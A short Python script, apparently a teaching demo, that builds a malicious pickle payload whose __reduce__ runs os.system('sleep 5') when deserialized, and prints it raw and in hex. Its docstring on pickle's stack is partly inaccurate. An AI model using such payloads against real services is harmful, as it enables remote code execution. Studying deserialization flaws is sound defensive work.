
import pickle
import os
import base64
import binascii 


"""
Pickle is a python package used to 'serialize' an object to string format and store them to or load from a file.
Pickle is a simple stack language, which means pickle has a variable stack.
Every time it finished 'deserializing' an object it stores it on the stack.
Every time it reaches a '.' while 'deserializing', it pop a variable from the stack.
Besides, pickle has a temperary memo, like a clipboard.
'p0', 'p1' means put the top obj on the stack to memo and refer it as '0' or '1'
'g0', 'g1' act as get obj '0' or '1'
"""

class RunBinSh(object):
  def __reduce__(self):
    return (os.system,('sleep 5',))

print('serialzed object:')
print(pickle.dumps(RunBinSh()))
print('')
print('')
print('serialized object to hex:')
print(binascii.hexlify(pickle.dumps(RunBinSh())))
